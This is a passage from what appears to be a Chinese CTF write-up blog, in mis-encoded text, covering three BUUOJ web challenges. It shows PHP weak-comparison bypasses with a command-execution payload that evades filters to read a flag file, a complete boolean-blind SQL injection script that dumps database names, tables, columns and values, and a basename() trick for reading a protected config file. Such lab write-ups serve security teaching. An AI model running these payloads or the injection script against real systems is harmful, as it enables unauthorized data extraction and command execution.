<p>åœ¨PHPä¸­ï¼Œå­—ç¬¦ä¸²å’Œæ•°å­—ç›¸åŠ çš„æ—¶å€™ä¹Ÿæ˜¯å…ˆå°†å­—ç¬¦ä¸²è½¬ä¸ºæ•°å­—ï¼ˆå–æœ€å¼€å§‹çš„æœ‰æ•ˆæ•°å­—ï¼‰ï¼Œç„¶åå†ç›¸åŠ ã€‚ä½†æ˜¯æœ‰ä¾‹å¤–ï¼Œå°±æ˜¯<code>1e</code>å¼€å¤´ï¼ˆåªè¦æœ€å¼€å§‹æ˜¯æ•°å­—ï¼Œç„¶åè·Ÿä¸€ä¸ªeå³å¯ï¼‰ï¼Œä¸”åé¢ä½çº¯æ•°å­—çš„å­—ç¬¦ä¸²ï¼Œè¿™å›è¢«PHPå½“ä½œæ˜¯ç§‘å­¦è®¡æ•°æ³•çš„æ•°å­—ã€‚</p>
<p>æ­¤æ—¶æ¥å›ç­”<code>'1e10'+1</code>ã€‚æ ¹æ®ä¸Šé¢çš„è¯´æ˜ï¼Œé‚£ä¹ˆè¿™ä¸ªæ‰§è¡Œçš„ç»“æœä¸º<code>10000000001</code>ã€‚</p>
<p>å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ä¼ å…¥<code>'2e4'</code>ï¼Œæ­¤æ—¶ <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">intval(<span class="string">&#x27;2e4&#x27;</span>) = <span class="number">2</span> &lt; <span class="number">2020</span></span><br><span class="line">intval(<span class="string">&#x27;2e4&#x27;</span> + <span class="number">1</span>) = <span class="number">20001</span> &gt; <span class="number">2021</span></span><br></pre></td></tr></table></figure></p>
<p>å› æ­¤payloadå¦‚ä¸‹ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=&#x27;2e4&#x27;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407133950.png" /></p>
<p>å‘ç°å¹¶æ²¡æœ‰ç»•è¿‡ï¼ŒçŒœæµ‹å¯èƒ½åå°ä»£ç é»˜è®¤å°†æˆ‘ä»¬çš„è¾“å…¥è½¬ä¸ºäº†å­—ç¬¦ä¸²ã€‚å› æ­¤ï¼Œå°è¯• <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=2e4</span><br></pre></td></tr></table></figure></p>
<p>æ­¤æ—¶ï¼ŒæˆåŠŸç»•è¿‡ï¼</p>
<h2 id="md5-å¼±ç±»å‹æ¯”è¾ƒç»•è¿‡">MD5 å¼±ç±»å‹æ¯”è¾ƒç»•è¿‡</h2>
<p>éœ€è¦ä»¥GETæ–¹å¼ä¼ å…¥å‚æ•°<code>md5</code>ï¼Œå¹¶ä¸”æ»¡è¶³ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$md5</span>==md5(<span class="variable">$md5</span>)</span><br></pre></td></tr></table></figure></p>
<p>ä¸ä¸Šé¢˜çš„åŸç†ç±»ä¼¼ã€‚å¦‚æœ<code>$md5=0e[åé¢æ˜¯çº¯æ•°å­—]</code>ï¼Œå¹¶ä¸”<code>md5($md5)=0e[åé¢æ˜¯çº¯æ•°å­—]</code>ï¼Œé‚£ä¹ˆæ­¤æ—¶ä¸¤è€…è¿›è¡Œæ¯”è¾ƒçš„æµç¨‹ï¼š</p>
<ol type="1">
<li>ä¼šè¢«å½“ä½œæ˜¯ç§‘å­¦è®¡æ•°æ³•è¡¨ç¤ºçš„æ•°å­—ï¼Œå› ä¸º0çš„å‡ æ¬¡æ–¹éƒ½æ˜¯0ï¼Œå› æ­¤ä¸¤è¾¹çš„å€¼éƒ½æ˜¯0</li>
<li><code>0==0</code> ç»“æœä¸ºTrue</li>
</ol>
<p>å†™ä¸€ä¸ªè„šæœ¬è·‘ä¸€ä¸‹æ»¡è¶³è¿™ç§æ¡ä»¶çš„å€¼ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib  </span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> count  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> count():  </span><br><span class="line">    valBase = <span class="string">&#x27;0e&#x27;</span>  </span><br><span class="line">    val = valBase + <span class="built_in">str</span>(i)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;checking <span class="subst">&#123;val&#125;</span> now:&quot;</span>, end=<span class="string">&#x27;\t&#x27;</span>)  </span><br><span class="line">    h = hashlib.md5()  </span><br><span class="line">    h.update(val.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>))  </span><br><span class="line">    valMD5 = h.hexdigest()  </span><br><span class="line">    <span class="keyword">if</span> valMD5[<span class="number">0</span>:<span class="number">2</span>] == valBase <span class="keyword">and</span> (valMD5[<span class="number">2</span>:]).isdigit():  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nfind it! val: &quot;</span> + val)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;And md5(val): &quot;</span> + valMD5)  </span><br><span class="line">        <span class="keyword">break</span>  </span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;No!&quot;</span>)</span><br></pre></td></tr></table></figure></p>
<p>ç»“æœä¸º<code>0e215962017</code>ï¼Œæ‰€ä»¥è¾“å…¥å¦‚ä¸‹payloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=2e4&amp;md5=0e215962017</span><br></pre></td></tr></table></figure></p>
<p>æˆåŠŸç»•è¿‡ç¬¬äºŒä¸ªifï¼</p>
<h2 id="å‘½ä»¤æ‰§è¡Œ">å‘½ä»¤æ‰§è¡Œ</h2>
<p>éœ€è¦ä»¥GETæ–¹å¼ä¼ å…¥å‚æ•°<code>get_flag</code>ï¼Œå¹¶ä¸”è¦æ»¡è¶³ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">!strstr(<span class="variable">$get_flag</span>,<span class="string">&quot;Â &quot;</span>) ä¸º çœŸ</span><br></pre></td></tr></table></figure></p>
<p>å¹¶ä¸”<code>cat</code>è¢«è¿‡æ»¤äº†ã€‚ä¹Ÿå°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„å‘½ä»¤ä¸èƒ½å¸¦æœ‰ç©ºæ ¼å’Œ<code>cat</code>ã€‚è¿™å…¶å®æ¯”è¾ƒå®¹æ˜“ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=2e4&amp;md5=0e215962017&amp;get_flag=ls # æŸ¥çœ‹å½“å‰ç›®å½•æ–‡ä»¶</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407135323.png" /></p>
<p>flagåº”è¯¥å°±åœ¨é‚£ä¸ªå·¨é•¿çš„åå­—çš„æ–‡ä»¶é‡Œé¢ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=2e4&amp;md5=0e215962017&amp;get_flag=tac&lt;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag # è¯»å–flag</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407135447.png" /></p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>æœ¬é¢˜å…¶å®è€ƒåœºçš„å°±æ˜¯PHPä¸­ç§‘å­¦è®¡æ•°æ³•çš„æ•°å­—å’Œå­—ç¬¦ä¸²çš„å…³ç³»ã€‚</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>PHPä¹‹ç§‘å­¦è®¡æ•°æ³•</tag>
      </tags>
  </entry>
  <entry>
    <title>WUSTCTF2020 é¢œå€¼æˆç»©æŸ¥è¯¢</title>
    <url>/2022/04/22/WUSTCTF2020%20%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2/</url>
    <content><![CDATA[<p>é¢˜ç›®åœ°å€ï¼š<a href="https://buuoj.cn/challenges#%5BWUSTCTF2020%5D%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2">WUSTCTF2020 é¢œå€¼æˆç»©æŸ¥è¯¢</a></p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">1. é¢˜ç›®ä¿¡æ¯</h1>
<p>è¿›å…¥ç¯å¢ƒï¼Œå¾—åˆ°ä¸€ä¸ªç™»å½•ç•Œé¢</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422105804.png" /></p>
<p>åˆ†åˆ«è¾“å…¥å¦‚ä¸‹å€¼æ—¶ï¼Œé¡µé¢å‡ºç°äº†ä¸ä¸€æ ·ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=1 # Hi admin, your score is: 100</span><br><span class="line">1=2 # student number not exists.</span><br></pre></td></tr></table></figure></p>
<p>å› æ­¤ç¡®å®šè¿™é‡Œå­˜åœ¨sqlæ³¨å…¥ï¼Œå¹¶ä¸”æ²¡æœ‰é—­åˆæ–¹å¼ï¼</p>
<h1 id="è§£é¢˜">2. è§£é¢˜</h1>
<p>é¦–å…ˆfuzzäº†ä¸€æ³¢ï¼Œå‘ç°ä»€ä¹ˆéƒ½æ²¡æœ‰è¿‡æ»¤ï¼Œä½†æ˜¯æœ‰æ—¶å€™åŠ ç©ºæ ¼å´ä¸è¡Œï¼Œæœ‰æ—¶å€™åŠ ç©ºæ ¼ç¡®å¯ä»¥ï¼Œæ¯”å¦‚ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0^(length((select (flag) from(flag)))&gt;0) # å¯ä»¥</span><br><span class="line">0^(length((select flag from(flag)))&gt;0) # ä¸è¡Œ</span><br></pre></td></tr></table></figure></p>
<p>ä»¥é˜²ä¸‡ä¸€ï¼Œæˆ‘å°±éƒ½ç”¨æ‹¬å·ä»£æ›¿ã€‚ <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, time  </span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> count</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ±‚æ•°æ®åº“é•¿åº¦  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lenOfdb</span>(<span class="params">url</span>):</span>  </span><br><span class="line">    <span class="built_in">len</span> = <span class="number">0</span>  </span><br><span class="line">    payload = <span class="string">&#x27;?stunum=0^(length(database())=%d)&#x27;</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the function lenOfdb is working!&quot;</span>)  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> count():  </span><br><span class="line">        finUrl = url + (payload % i)  </span><br><span class="line">        <span class="comment"># print(finUrl)  </span></span><br><span class="line">        r = requests.get(finUrl)  </span><br><span class="line">        time.sleep(<span class="number">0.3</span>)  </span><br><span class="line">        <span class="comment"># print(r.text)  </span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Success! the len of db is %d&quot;</span> % i)  </span><br><span class="line">            <span class="built_in">len</span> = i  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># æ±‚æ•°æ®åº“åå­—  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbName</span>(<span class="params">url, <span class="built_in">len</span></span>):</span>  </span><br><span class="line">    db = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">    payload = <span class="string">&#x27;?stunum=0^(ascii(substr(database(),%d,1))=%d)&#x27;</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the function dbName is working!&quot;</span>)  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>+<span class="number">1</span>):  </span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">128</span>):  </span><br><span class="line">            finUrl = url + (payload % (i, j))  </span><br><span class="line">            <span class="comment"># print(finUrl)  </span></span><br><span class="line">            r = requests.get(finUrl)  </span><br><span class="line">            time.sleep(<span class="number">0.3</span>)  </span><br><span class="line">            <span class="comment"># print(r.text)  </span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;the <span class="subst">&#123;i&#125;</span>th of database&#x27;s name is : &quot;</span> + <span class="built_in">chr</span>(j))  </span><br><span class="line">                db += <span class="built_in">chr</span>(j)  </span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Success! the database&#x27;s name is : &quot;</span> + db )  </span><br><span class="line">    <span class="keyword">return</span> db  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># æ±‚æ•°æ®åº“ä¸‹group_concat(table_name)çš„é•¿åº¦  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tablesLen</span>(<span class="params">url, dbname</span>):</span>  </span><br><span class="line">    <span class="built_in">len</span> = <span class="number">0</span>  </span><br><span class="line">    payload = <span class="string">&quot;?stunum=0^(length((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;%s&#x27;)))=%d)&quot;</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the function tablesLen is working!&quot;</span>)  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> count():  </span><br><span class="line">        finUrl = url + (payload % (dbname, i))  </span><br><span class="line">        r = requests.get(finUrl)  </span><br><span class="line">        time.sleep(<span class="number">0.3</span>)  </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Success! the length of group_concat(table_name) is : %d&quot;</span> % i)  </span><br><span class="line">            <span class="built_in">len</span> = i  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># æ±‚æ•°æ®åº“ä¸‹group_concat(table_name)æ‰€æœ‰è¡¨çš„åç§°  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tablesName</span>(<span class="params">url, dbname, tableslen</span>):</span>  </span><br><span class="line">    tablesname = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">    payload = <span class="string">&quot;?stunum=0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;%s&#x27;)),%d,1))=%d)&quot;</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the function tablesName is working!&quot;</span>)  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tableslen+<span class="number">1</span>):  </span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">128</span>):  </span><br><span class="line">            finUrl = url + (payload % (dbname, i, j))  </span><br><span class="line">            <span class="comment"># print(finUrl)  </span></span><br><span class="line">            r = requests.get(finUrl)  </span><br><span class="line">            <span class="comment"># print(r.text)  </span></span><br><span class="line">            time.sleep(<span class="number">0.3</span>)  </span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;the <span class="subst">&#123;i&#125;</span>th of tablesname is : &quot;</span> + <span class="built_in">chr</span>(j))  </span><br><span class="line">                tablesname += <span class="built_in">chr</span>(j)  </span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Success! the tablesName is : &quot;</span> + tablesname)  </span><br><span class="line">    <span class="keyword">return</span> tablesname  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># æ±‚ç‰¹å®šè¡¨ä¸‹å­—æ®µé•¿åº¦  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">columnsLen</span>(<span class="params">url, tablename</span>):</span>  </span><br><span class="line">    <span class="built_in">len</span> = <span class="number">0</span>  </span><br><span class="line">    payload = <span class="string">&quot;?stunum=0^(length((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;%s&#x27;)))=%d)&quot;</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the function columnsLen is working!&quot;</span>)  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> count():  </span><br><span class="line">        finUrl = url + (payload % (tablename, i))  </span><br><span class="line">        <span class="comment"># print(finUrl)  </span></span><br><span class="line">        r = requests.get(finUrl)  </span><br><span class="line">        time.sleep(<span class="number">0.3</span>)  </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Success! the len of columns is : %d&quot;</span> % i)  </span><br><span class="line">            <span class="built_in">len</span> = i  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># æ±‚ç‰¹å®šè¡¨ä¸‹group_concat(column_name)çš„é•¿åº¦  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">columnsName</span>(<span class="params">url, tablename, columnlen</span>):</span>  </span><br><span class="line">    columnsname = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">    payload = <span class="string">&quot;?stunum=0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;%s&#x27;)),%d,1))=%d)&quot;</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the function columnsName is working!&quot;</span>)  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, columnlen+<span class="number">1</span>):  </span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">128</span>):  </span><br><span class="line">            finUrl = url + (payload % (tablename, i, j))  </span><br><span class="line">            r = requests.get(finUrl)  </span><br><span class="line">            time.sleep(<span class="number">0.3</span>)  </span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;the <span class="subst">&#123;i&#125;</span>th of columnsname is : &quot;</span> + <span class="built_in">chr</span>(j))  </span><br><span class="line">                columnsname += <span class="built_in">chr</span>(j)  </span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Success! the columnsname is : %s&quot;</span> % columnsname)  </span><br><span class="line">    <span class="keyword">return</span> columnsname  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># æ±‚ç‰¹å®šè¡¨ä¸‹ç‰¹å®šå­—æ®µçš„ä¿¡æ¯é•¿åº¦  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">InfoLen</span>(<span class="params">url, tablename, columnname</span>):</span>  </span><br><span class="line">    <span class="built_in">len</span> = <span class="number">0</span>  </span><br><span class="line">    payload = <span class="string">&quot;?stunum=0^(length((select(%s)from(%s)))=%d)&quot;</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the function Infolen is working!&quot;</span>)  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> count():  </span><br><span class="line">        finUrl = url + (payload % (columnname, tablename, i))  </span><br><span class="line">        <span class="comment"># print(finUrl)  </span></span><br><span class="line">        r = requests.get(finUrl)  </span><br><span class="line">        time.sleep(<span class="number">0.3</span>)  </span><br><span class="line">        <span class="comment"># print(r.text)  </span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Success! the len of Info is : %d&quot;</span> % i)  </span><br><span class="line">            <span class="built_in">len</span> = i  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># æ±‚ç‰¹å®šè¡¨ä¸‹ç‰¹å®šå­—æ®µçš„ä¿¡æ¯  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getInfo</span>(<span class="params">url, tablename, columnname, Infolen</span>):</span>  </span><br><span class="line">    Info = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">    payload = <span class="string">&quot;?stunum=0^(ascii(substr((select(%s)from(%s)),%d,1))=%d)&quot;</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the function getInfo is working!&quot;</span>)  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, Infolen+<span class="number">1</span>):  </span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">128</span>):  </span><br><span class="line">            finUrl = url + (payload % (columnname, tablename, i, j))  </span><br><span class="line">            <span class="comment"># print(finUrl)  </span></span><br><span class="line">            r = requests.get(finUrl)  </span><br><span class="line">            time.sleep(<span class="number">0.3</span>)  </span><br><span class="line">            <span class="comment"># print(r.text)  </span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;the <span class="subst">&#123;i&#125;</span>th of Info is : %s&quot;</span> % <span class="built_in">chr</span>(j))  </span><br><span class="line">                Info += <span class="built_in">chr</span>(j)  </span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Success! the Info is : %s&quot;</span> % Info)  </span><br><span class="line">    <span class="keyword">return</span> Info  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    url = <span class="string">&#x27;http://2f0a7c25-26c9-43ff-8aac-7afda31cb1f7.node4.buuoj.cn:81/&#x27;</span>  </span><br><span class="line">    dblen = lenOfdb(url)  </span><br><span class="line">    db = dbName(url, dblen)  </span><br><span class="line">    tableslen = tablesLen(url, db)  </span><br><span class="line">    tablesTable = tablesName(url, <span class="string">&#x27;ctf&#x27;</span>, tableslen).split(<span class="string">&#x27;,&#x27;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(tablesTable)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;é€‰æ‹©è¦æŸ¥çš„è¡¨ï¼š(è¾“å…¥æ•°å­—ï¼Œä»0å¼€å§‹)&quot;</span>)  </span><br><span class="line">    tIndex = <span class="built_in">int</span>(<span class="built_in">input</span>())  </span><br><span class="line">    columnlen = columnsLen(url, tablesTable[tIndex])  </span><br><span class="line">    columnsTable = columnsName(url, tablesTable[tIndex], columnlen).split(<span class="string">&#x27;,&#x27;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(columnsTable)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;é€‰æ‹©è¦æŸ¥çš„å­—æ®µï¼š(è¾“å…¥æ•°å­—ï¼Œä»0å¼€å§‹)&quot;</span>)  </span><br><span class="line">    cIndex = <span class="built_in">int</span>(<span class="built_in">input</span>())  </span><br><span class="line">    infolen = InfoLen(url, tablesTable[tIndex], columnsTable[cIndex])  </span><br><span class="line">    getInfo(url, tablesTable[tIndex], columnsTable[cIndex], infolen)</span><br></pre></td></tr></table></figure></p>
<p><strong>éœ€è¦æ³¨æ„çš„æ˜¯flagåœ¨flagè¡¨å†…çš„valueå­—æ®µä¸‹ï¼Œè€Œä¸åœ¨flagå­—æ®µä¸‹</strong></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SQLæ³¨å…¥</tag>
        <tag>å¸ƒå°”ç›²æ³¨</tag>
      </tags>
  </entry>
  <entry>
    <title>Zer0pts2020 Can you guess it</title>
    <url>/2022/04/24/Zer0pts2020%20Can%20you%20guess%20it/</url>
    <content><![CDATA[<p>é¢˜ç›®åœ°å€ï¼š<a href="https://buuoj.cn/challenges#%5BZer0pts2020%5DCan%20you%20guess%20it?">Can you guess it?</a></p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">1. é¢˜ç›®ä¿¡æ¯</h1>
<p>è¿›å…¥ç¯å¢ƒä¹‹åï¼Œç‚¹å‡»Sourceå¾—åˆ°å¦‚ä¸‹æºç ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  highlight_file(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = bin2hex(random_bytes(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (hash_equals(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="è§£é¢˜">2. è§£é¢˜</h1>
<p>ä¹ä¸€çœ‹ï¼Œæœ‰ä¸¤ä¸ªçªç ´ç‚¹ï¼š</p>
<ol type="1">
<li><p>é€šè¿‡highlight_file()å‡½æ•°ï¼ŒæŠŠconfi.phpå½“ä½œå‚æ•°å³å¯ï¼›</p></li>
<li><p>ç»•è¿‡hash_equals()ï¼Œä»è€Œè¾“å‡ºflagï¼›</p></li>
</ol>
<p>ä½†æ˜¯ï¼Œç»è¿‡åˆ†æï¼Œç¬¬äºŒç‚¹æ— æ³•çªç ´ï¼Œ<code>$secret</code>æ˜¯éšæœºçš„ï¼Œhash_equalsä¸åƒå…¶ä»–å‡½æ•°å¯ä»¥é€šè¿‡æ•°ç»„è¿™äº›ç»•è¿‡ã€‚å› æ­¤ï¼Œç›®å…‰å›åˆ°ç¬¬ä¸€ç‚¹ã€‚</p>
<p>é¦–å…ˆï¼Œå‡è®¾æˆ‘ä»¬çš„urlä¸º: <code>http://hostname/test/index.php?source=balabala</code>ï¼Œé‚£ä¹ˆ<code>$_SERVER['PHP_SELF'])</code>çš„è¿”å›ç»“æœå°±æ˜¯/test/index.phpï¼›<code>basename($_SERVER['PHP_SELF'])</code>è¿”å›çš„ç»“æœå°±æ˜¯index.phpã€‚</p>
<p>ä¹ä¸€çœ‹å¾ˆå®Œç¾ï¼Œæ²¡æœ‰æ¼æ´å¯è¨€ï¼Œä½†æ˜¯basenameæœ‰ä¸€ä¸ªå°é—®é¢˜ï¼Œé‚£å°±æ˜¯å¦‚æœåœ°å€ä¸­æ–‡ä»¶çš„åé¢å‡ºç°éasciiç çš„ç‰¹æ®Šå­—ç¬¦ï¼ˆä¸åœ¨ASCIIç ä¸­ï¼‰ï¼Œé‚£ä¹ˆbasenameå°±ä¼šå½“ä½œæ²¡çœ‹è§ã€‚æ¯”å¦‚è¿™æ ·çš„url: <code>http://hostname/test/basename.php/%81?source=balabala</code>ï¼ˆè¿™é‡Œçš„%81å€¼å¾—æ˜¯16è¿›åˆ¶çš„81ï¼Œè€Œasciiç æœ€å¤§å°±åˆ°7fï¼Œå› æ­¤å·²ç»è¶…è¿‡ï¼‰ï¼Œé‚£ä¹ˆæ­¤æ—¶ï¼Œbasenameçœ¼ä¸­çš„urlä¸º<code>http://hostname/test/basename.php/?source=balabala</code>ï¼Œå› æ­¤æœ€ç»ˆè¿”å›çš„ç»“æœå°±æ˜¯basename.phpã€‚</p>
